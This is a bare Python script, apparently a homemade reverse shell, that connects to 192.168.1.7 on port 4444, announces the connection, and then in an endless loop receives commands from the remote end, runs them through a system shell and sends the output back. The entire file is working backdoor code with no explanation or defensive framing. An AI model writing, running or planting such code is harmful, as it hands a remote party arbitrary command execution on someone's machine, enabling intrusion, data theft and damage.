#!/usr/bin/python3
import socket
import subprocess

def execute_commands(command):
    return subprocess.check_output(command,shell=True)

connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect(("192.168.1.7",4444))

msg = "\n[+]connection established\n"
connection.send(msg.encode('ascii'))

while(True):
    recieved_data = connection.recv(1024).decode()
    command_result = execute_commands(recieved_data)
    connection.send(command_result)

connection.close()